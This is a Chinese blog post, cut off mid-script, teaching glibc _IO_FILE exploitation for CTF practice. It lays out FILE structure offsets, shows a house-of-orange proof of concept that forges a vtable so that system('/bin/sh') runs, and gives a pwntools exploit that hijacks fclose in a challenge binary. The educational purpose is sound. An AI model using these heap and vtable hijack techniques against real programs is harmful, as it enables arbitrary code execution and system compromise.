<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    
    
    <title>_IO_FILE 利用方法 | Room of Requirement | pwn what you want</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="keywords" content="pwn,file">
    <link rel="shortcut icon" href="/img/favicon.ico">
    <link rel="stylesheet" href="/css/third-party/swipebox.min.css?v=1.3.2">
    <link rel="stylesheet" href="/css/style.css?v=1.3.2">
    
    <script type="text/javascript">
        // Data Center
        var DC = {
            reward:	true,
            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
            g: JSON.parse('{"enable":false,"lazy":true,"owner":"siriuswhiter","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
            d: JSON.parse('{"app_id":null}')
        };
    </script>
    <script type="text/javascript">
        window.lazyScripts=[];
    </script>
    
</head>


<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap">
      
      <img src="/img/brand.jpg" class="brand-bg">
      
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Sirius Whiter</h5>
          <a href="mailto:xuewenjie2017@outlook.com" title="xuewenjie2017@outlook.com" class="mail">
            
              <span>x</span>
            
              <span>u</span>
            
              <span>e</span>
            
              <span>w</span>
            
              <span>e</span>
            
              <span>n</span>
            
              <span>j</span>
            
              <span>i</span>
            
              <span>e</span>
            
              <span>2</span>
            
              <span>0</span>
            
              <span>1</span>
            
              <span>7</span>
            
              <span>@</span>
            
              <span>o</span>
            
              <span>u</span>
            
              <span>t</span>
            
              <span>l</span>
            
              <span>o</span>
            
              <span>o</span>
            
              <span>k</span>
            
              <span>.</span>
            
              <span>c</span>
            
              <span>o</span>
            
              <span>m</span>
            
          </a>
        </hgroup>
        
        <ul class="menu-link">
          
              <li>
                <a href="https://github.com/siriuswhiter" target="_blank">
                  <i class="icon icon-lg icon-github"></i>
                </a>
              </li>
            
        </ul>
        
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                HOME
              </a>
            </li>
        
            <li class="">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                CATEGORIES
              </a>
            </li>
        
            <li class="">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                TAGS
              </a>
            </li>
        
            <li class="">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                ARCHIVES
              </a>
            </li>
        
            <li class="">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                ABOUT
              </a>
            </li>
        
            <li class="">
              <a href="https://github.com/siriuswhiter" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        
	
<header class="top-header" id="header">
    <div class="flex-row clearfix">
        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">
            <span>_IO_FILE 利用方法</span>
            
        </div>
        
        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
            <i class="icon icon-lg icon-search"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">
    <img src="/img/banner.jpg" class="header-bg">
    <div class="container fade-scale">
        <h1 class="title">_IO_FILE 利用方法</h1>
        <h5 class="subtitle">
            
                <time datetime="2019-07-09T07:51:56.000Z" itemprop="datePublished" class="page-time">
  2019-07-09
</time>


	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/pwn/">pwn</a></li></ul>

            
        </h5>
        
    </div>
    

</header>

<div id="site_search">
    <div class="search-title clearfix">
        <span class="pull-left">
          <i class="icon icon-lg icon-search"></i>
        </span>
        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
          <i class="icon icon-lg icon-close"></i>
        </a>
    </div>
    <div id="local-search-result"></div>
</div>




<div class="container body-wrap">
    <article id="post-io-file-利用方法"
  class="post-article article-type-post" itemprop="blogPost">
    <div class="post-card">
        <h1 class="post-card-title">_IO_FILE 利用方法</h1>
        <div class="post-meta">
            <time class="post-time" title="2019-07-09 15:51:56" datetime="2019-07-09T07:51:56.000Z"  itemprop="datePublished">2019-07-09</time>

            
	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/pwn/">pwn</a></li></ul>



            

            


            
        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            
            <h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>细节知识可以看<a href="https://www.siriuswhiter.tk/2019/07/08/io-file-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://www.siriuswhiter.tk/2019/07/08/io-file-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</a></p>
<p>FILE结构体会通过struct _IO_FILE *_chain链接成一个链表，64位程序下其偏移为0x60，链表头部用_IO_list_all指针表示。<br><figure class="image-box">
                <a rel=_IO_FILE 利用方法 href="/2019/07/09/io-file-利用方法/1.png" class="swipebox" title=undefined><img src="/2019/07/09/io-file-利用方法/1.png" alt="图示" title="" class=""></a>
                <p>图示</p>
            </figure></p>
<p>所以新建的文件句柄的chains会指向stderr</p>
<p>IO_file结构体外面还被一个IO_FILE_plus结构体包裹着，其定义如下：</p>
<p>struct _IO_FILE_plus<br>{<br>    _IO_FILE    file;<br>    IO_jump_t   *vtable;<br>}</p>
<p>输出方法,eg:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p  *(struct _IO_FILE_plus *) stdout</span><br></pre></td></tr></table></figure></p>
<h3 id="IO-FILE-结构体"><a href="#IO-FILE-结构体" class="headerlink" title="IO_FILE 结构体"></a>IO_FILE 结构体</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_FILE &#123;</span><br><span class="line">  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */</span><br><span class="line">#define _IO_file_flags _flags</span><br><span class="line"></span><br><span class="line">  /* The following pointers correspond to the C++ streambuf protocol. */</span><br><span class="line">  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br><span class="line">  char* _IO_read_ptr;	/* Current read pointer */</span><br><span class="line">  char* _IO_read_end;	/* End of get area. */</span><br><span class="line">  char* _IO_read_base;	/* Start of putback+get area. */</span><br><span class="line">  char* _IO_write_base;	/* Start of put area. */</span><br><span class="line">  char* _IO_write_ptr;	/* Current put pointer. */</span><br><span class="line">  char* _IO_write_end;	/* End of put area. */</span><br><span class="line">  char* _IO_buf_base;	/* Start of reserve area. */</span><br><span class="line">  char* _IO_buf_end;	/* End of reserve area. */</span><br><span class="line">  /* The following fields are used to support backing up and undo. */</span><br><span class="line">  char *_IO_save_base; /* Pointer to start of non-current get area. */</span><br><span class="line">  char *_IO_backup_base;  /* Pointer to first valid character of backup area */</span><br><span class="line">  char *_IO_save_end; /* Pointer to end of non-current get area. */</span><br><span class="line"></span><br><span class="line">  struct _IO_marker *_markers;</span><br><span class="line"></span><br><span class="line">  struct _IO_FILE *_chain;                       /* 偏移： 0x68-0x70 */</span><br><span class="line"></span><br><span class="line">  int _fileno;                                   /* 文件描述符 fd */</span><br><span class="line">#if 0</span><br><span class="line">  int _blksize;</span><br><span class="line">#else</span><br><span class="line">  int _flags2;</span><br><span class="line">#endif</span><br><span class="line">  _IO_off_t _old_offset; /* This used to be _offset but it&apos;s too small.  */</span><br><span class="line"></span><br><span class="line">#define __HAVE_COLUMN /* temporary */</span><br><span class="line">  /* 1+column number of pbase(); 0 is unknown. */</span><br><span class="line">  unsigned short _cur_column;</span><br><span class="line">  signed char _vtable_offset;                    </span><br><span class="line">  char _shortbuf[1];</span><br><span class="line"></span><br><span class="line">  /*  char* _save_gptr;  char* _save_egptr; */</span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line">#ifdef _IO_USE_OLD_IO_FILE</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="偏移记录"><a href="#偏移记录" class="headerlink" title="偏移记录"></a>偏移记录</h3><p>方便在使用时查看偏移进行伪造</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">_IO_FILE_plus_size = &#123;</span><br><span class="line">	&apos;i386&apos;:0x98,</span><br><span class="line">	&apos;amd64&apos;:0xe0</span><br><span class="line">&#125;</span><br><span class="line">_IO_FILE_plus = &#123;</span><br><span class="line">	&apos;i386&apos;:&#123;</span><br><span class="line">		0x0:&apos;_flags&apos;,</span><br><span class="line">		0x4:&apos;_IO_read_ptr&apos;,</span><br><span class="line">		0x8:&apos;_IO_read_end&apos;,</span><br><span class="line">		0xc:&apos;_IO_read_base&apos;,</span><br><span class="line">		0x10:&apos;_IO_write_base&apos;,</span><br><span class="line">		0x14:&apos;_IO_write_ptr&apos;,</span><br><span class="line">		0x18:&apos;_IO_write_end&apos;,</span><br><span class="line">		0x1c:&apos;_IO_buf_base&apos;,</span><br><span class="line">		0x20:&apos;_IO_buf_end&apos;,</span><br><span class="line">		0x24:&apos;_IO_save_base&apos;,</span><br><span class="line">		0x28:&apos;_IO_backup_base&apos;,</span><br><span class="line">		0x2c:&apos;_IO_save_end&apos;,</span><br><span class="line">		0x30:&apos;_markers&apos;,</span><br><span class="line">		0x34:&apos;_chain&apos;,</span><br><span class="line">		0x38:&apos;_fileno&apos;,</span><br><span class="line">		0x3c:&apos;_flags2&apos;,</span><br><span class="line">		0x40:&apos;_old_offset&apos;,</span><br><span class="line">		0x44:&apos;_cur_column&apos;,</span><br><span class="line">		0x46:&apos;_vtable_offset&apos;,</span><br><span class="line">		0x47:&apos;_shortbuf&apos;,</span><br><span class="line">		0x48:&apos;_lock&apos;,</span><br><span class="line">		0x4c:&apos;_offset&apos;,</span><br><span class="line">		0x54:&apos;_codecvt&apos;,</span><br><span class="line">		0x58:&apos;_wide_data&apos;,</span><br><span class="line">		0x5c:&apos;_freeres_list&apos;,</span><br><span class="line">		0x60:&apos;_freeres_buf&apos;,</span><br><span class="line">		0x64:&apos;__pad5&apos;,</span><br><span class="line">		0x68:&apos;_mode&apos;,</span><br><span class="line">		0x6c:&apos;_unused2&apos;,</span><br><span class="line">		0x94:&apos;vtable&apos;</span><br><span class="line">	&#125;,</span><br><span class="line"></span><br><span class="line">	&apos;amd64&apos;:&#123;</span><br><span class="line">		0x0:&apos;_flags&apos;,</span><br><span class="line">		0x8:&apos;_IO_read_ptr&apos;,</span><br><span class="line">		0x10:&apos;_IO_read_end&apos;,</span><br><span class="line">		0x18:&apos;_IO_read_base&apos;,</span><br><span class="line">		0x20:&apos;_IO_write_base&apos;,</span><br><span class="line">		0x28:&apos;_IO_write_ptr&apos;,</span><br><span class="line">		0x30:&apos;_IO_write_end&apos;,</span><br><span class="line">		0x38:&apos;_IO_buf_base&apos;,</span><br><span class="line">		0x40:&apos;_IO_buf_end&apos;,</span><br><span class="line">		0x48:&apos;_IO_save_base&apos;,</span><br><span class="line">		0x50:&apos;_IO_backup_base&apos;,</span><br><span class="line">		0x58:&apos;_IO_save_end&apos;,</span><br><span class="line">		0x60:&apos;_markers&apos;,</span><br><span class="line">		0x68:&apos;_chain&apos;,</span><br><span class="line">		0x70:&apos;_fileno&apos;,</span><br><span class="line">		0x74:&apos;_flags2&apos;,</span><br><span class="line">		0x78:&apos;_old_offset&apos;,</span><br><span class="line">		0x80:&apos;_cur_column&apos;,</span><br><span class="line">		0x82:&apos;_vtable_offset&apos;,</span><br><span class="line">		0x83:&apos;_shortbuf&apos;,</span><br><span class="line">		0x88:&apos;_lock&apos;,</span><br><span class="line">		0x90:&apos;_offset&apos;,</span><br><span class="line">		0x98:&apos;_codecvt&apos;,</span><br><span class="line">		0xa0:&apos;_wide_data&apos;,</span><br><span class="line">		0xa8:&apos;_freeres_list&apos;,</span><br><span class="line">		0xb0:&apos;_freeres_buf&apos;,</span><br><span class="line">		0xb8:&apos;__pad5&apos;,</span><br><span class="line">		0xc0:&apos;_mode&apos;,</span><br><span class="line">		0xc4:&apos;_unused2&apos;,</span><br><span class="line">		0xd8:&apos;vtable&apos;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="IO-jump-t表结构"><a href="#IO-jump-t表结构" class="headerlink" title="IO_jump_t表结构"></a>IO_jump_t表结构</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_jump_t</span><br><span class="line">&#123;</span><br><span class="line">    JUMP_FIELD(size_t, __dummy);</span><br><span class="line">    JUMP_FIELD(size_t, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    /* showmany */</span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="常用对应iofile函数"><a href="#常用对应iofile函数" class="headerlink" title="常用对应iofile函数"></a>常用对应iofile函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fread    -&gt; __xsgetn   -&gt; __doallocate  -&gt; __stat  -&gt; __underflow -&gt; __read</span><br><span class="line">fwrite    -&gt; __xsputn   -&gt; __docallocate  -&gt; __overflow  -&gt; __write</span><br><span class="line">fclose    -&gt;  __finish  -&gt; __overflow  /  -&gt; __fclose   //根据标志位来改变模式</span><br><span class="line">malloc_printerr    -&gt; __overflow</span><br><span class="line">exit    -&gt; _setbuf</span><br></pre></td></tr></table></figure>
<h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><p>在源码分析中我们知道io相关操作最后会调用vtable中的函数，所以利用方法就是修改vtable中的值，或者是实现对整个FILE结构体的伪造来修改虚表，当然本质上没有太大的区别。</p>
<h1 id="利用演示"><a href="#利用演示" class="headerlink" title="利用演示"></a>利用演示</h1><p>还是使用下how2heap上的例子，这里是结合了house of orange，可以跟着源码调试理解。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int winner ( char *ptr);</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    char *p1, *p2;</span><br><span class="line">    size_t io_list_all, *top;</span><br><span class="line"></span><br><span class="line">    // 首先分配一个 0x400 的 chunk</span><br><span class="line">    p1 = malloc(0x400-16);</span><br><span class="line"></span><br><span class="line">    // 拿到 top chunk的地址</span><br><span class="line">    top = (size_t *) ( (char *) p1 + 0x400 - 16);</span><br><span class="line">    // 修改 top chunk 的 size</span><br><span class="line">    top[1] = 0xc01;</span><br><span class="line"></span><br><span class="line">    // 触发 syscall 的 _int_free, top_chunk 放到了 unsort bin</span><br><span class="line">    p2 = malloc(0x1000);</span><br><span class="line"></span><br><span class="line">    // 根据 fd 指针的偏移计算 io_list_all 的地址</span><br><span class="line">    io_list_all = top[2] + 0x9a8;</span><br><span class="line"></span><br><span class="line">    // 修改 top_chunk 的 bk 为  io_list_all - 0x10 ， 后面会触发</span><br><span class="line">    top[3] = io_list_all - 0x10;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     设置 fp 指针指向位置 开头 为 /bin/sh</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    memcpy( ( char *) top, &quot;/bin/sh\x00&quot;, 8);</span><br><span class="line"></span><br><span class="line">    // 修改 top chunk 的 大小 为 0x60</span><br><span class="line">    top[1] = 0x61;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">      为了可以正常调用 overflow() ，需要满足一些条件</span><br><span class="line">      fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    _IO_FILE *fp = (_IO_FILE *) top;</span><br><span class="line"></span><br><span class="line">    fp-&gt;_mode = 0; </span><br><span class="line">    fp-&gt;_IO_write_base = (char *) 2;</span><br><span class="line">    fp-&gt;_IO_write_ptr = (char *) 3; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 设置虚表</span><br><span class="line">    size_t *jump_table = &amp;top[12]; // controlled memory</span><br><span class="line">    jump_table[3] = (size_t) &amp;winner;</span><br><span class="line">    *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table; // top+0xd8</span><br><span class="line"></span><br><span class="line">    // 再次 malloc, fastbin, smallbin都找不到需要的大小，会遍历 unsort bin 把它们添加到对应的 bins 中去</span><br><span class="line">    // 之前已经把 top-&gt;bk 设置为 io_list_all - 0x10, 所以会把 io_list_all 的值 设置为 fd, </span><br><span class="line">    // 也就是 main_arena+88 </span><br><span class="line">    // _IO_FILE_plus + 0x68 --&gt; _china , main_arena+88 + 0x68 为 smallbin[5], 块大小为 0x60 </span><br><span class="line">    // 所以要把 top的 size 设置为 0x60</span><br><span class="line">    malloc(10);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int winner(char *ptr)</span><br><span class="line">&#123; </span><br><span class="line">    system(ptr);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>可以发现，实际上在利用时是将top chunk放入unsorted bin中之后将其作为FILE结构体，并将虚表设置在了FILE结构体中，最后触发malloc_printerr，内部调用<strong>libc_message，再内部调用abort，abort中调用fflush即_IO_flush_all_lockp，其中调用</strong>OVERFLOW时调用 vtable中的 __overflow，触发system(‘/bin/sh’)。</p>
<p>当然利用方法不止这一种，也能够使程序去调用其他函数getshell。</p>
<h1 id="利用实例"><a href="#利用实例" class="headerlink" title="利用实例"></a>利用实例</h1><h2 id="task-challenge1"><a href="#task-challenge1" class="headerlink" title="task_challenge1"></a>task_challenge1</h2><h3 id="方向"><a href="#方向" class="headerlink" title="方向"></a>方向</h3><p>控制fp指针伪造FILE 与 vtable，因为fclose时调用vtable中的_finish，所以将其覆盖为system</p>
<p>伪造的FILE结构体前四个字节需要满足 flags &amp; is_filebuf 即 flags &amp; 0x2000为0，会直接调用_io_finish<br>0xffffdfff  &amp; 0x2000 = 0</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#define _IO_IS_FILEBUF 0x2000</span><br><span class="line"></span><br><span class="line">if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((struct _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br><span class="line">  else</span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? -1 : 0;</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  _IO_FINISH (fp);</span><br></pre></td></tr></table></figure>
<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>一道iofile练手题，与pwnable.tw上那道有些相似，可以输入，输出，退出</p>
<p>输入直接调用gets，在bss段，可以覆盖打开文件的指针，伪造结构体可以一块进行<br>退出会调用fclose关闭文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.bss:00000000006010C0 ; char s[256]</span><br><span class="line">.bss:00000000006010C0 s               db 100h dup(?)          ; DATA XREF: get+4↑o</span><br><span class="line">.bss:00000000006010C0                                         ; put+4↑o</span><br><span class="line">.bss:00000000006011C0 ; FILE *stream</span><br><span class="line">.bss:00000000006011C0 stream          dq ?                    ; DATA XREF: exits+4↑r</span><br></pre></td></tr></table></figure></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">	local = 0</span><br><span class="line">else:</span><br><span class="line">	local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">	sh = process(&apos;./task_challenge1&apos;)</span><br><span class="line">	elf = ELF(&apos;./task_challenge1&apos;)</span><br><span class="line">	libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">	sh = remote(&apos;&apos;,&apos;&apos;)</span><br><span class="line">	elf = ELF(&apos;task_challenge1&apos;)</span><br><span class="line">	#libc=ELF(&apos;&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buf_addr = 0x6010c0</span><br><span class="line">system = 0x400897</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_file = p32(0xffffdfff)+&apos;;/bin/sh\x00&apos;</span><br><span class="line">fake_file = fake_file.ljust(0xd8,&apos;\0&apos;)</span><br><span class="line">vtable = buf_addr+0xe0</span><br><span class="line">fake_file += p64(vtable)</span><br><span class="line"></span><br><span class="line">pay = fake_file</span><br><span class="line">pay += p64(0)*2</span><br><span class="line">pay += p64(system)             #vtable finish , fclose will call this func.</span><br><span class="line">pay = 